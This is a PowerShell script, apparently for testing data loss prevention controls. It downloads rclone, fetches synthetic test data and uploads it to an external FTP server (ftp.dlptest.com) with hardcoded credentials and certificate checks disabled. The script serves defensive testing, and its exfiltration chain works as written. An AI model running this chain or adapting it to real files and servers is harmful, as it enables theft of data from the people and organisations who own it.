<#
=========================================================================================
Script Name:    RClone-FTP_Exfil.ps1
Description:    This script performs the following actions:
                1. Creates/ensures a working download directory in C:\Users\Public\Downloads.
                2. Downloads the latest rclone Windows package.
                3. Extracts rclone and locates the rclone.exe binary.
                4. Downloads a ZIP file containing synthetic DLP test data.
                5. Configures an FTP remote in rclone using test credentials.
                6. Uploads the synthetic test data (exfil.zip) to the FTP server
                   for the purpose of validating DLP monitoring, alerts, and controls.
                7. Displays status messages throughout execution and notifies when upload is complete.

Author:         Jimmi Aylesworth
Date:           2025-11-25
Warning:        PROCEED WITH CAUTION!
                - This script performs automated data transfer to an external FTP server.
                - Use ONLY with synthetic, non-sensitive test data.
                - Ensure you have appropriate authorization for DLP testing.
                - Avoid running on production systems without proper approval.
=========================================================================================
#>

# Define paths
$downloadDir = "C:\Users\Public\Downloads"
$rcloneUrl = "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
$rcloneZip = "$downloadDir\rclone.zip"
$rcloneExe = "$downloadDir\rclone.exe"
$exfilZip = "$downloadDir\exfil.zip"

# Create download directory if not exists
if (!(Test-Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir | Out-Null
}

Write-Host "Downloading rclone..."
Invoke-WebRequest -Uri $rcloneUrl -OutFile $rcloneZip

Write-Host "Extracting rclone..."
Expand-Archive -Path $rcloneZip -DestinationPath $downloadDir -Force

# Find rclone.exe inside extracted folder
$rcloneExePath = Get-ChildItem $downloadDir -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName

# Fetch synthetic DLP data
Write-Host "Fetching synthetic test data..."
$dlpDataZip = "https://dlptest.com/DLP-Test-State-Data.zip"
Invoke-WebRequest -Uri $dlpDataZip -OutFile $exfilZip

# FTP setting / execution
Write-Host "Configuring FTP remote..."
& $rcloneExePath config create ftpserver ftp host ftp.dlptest.com user dlpuser pass rNrKYTX9g7z3RgJRmxWuGHbeu

Write-Host "Uploading exfil.zip to FTP..."
& $rcloneExePath copy $exfilZip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate

Write-Host "Upload complete. Check DLP logs for activity."
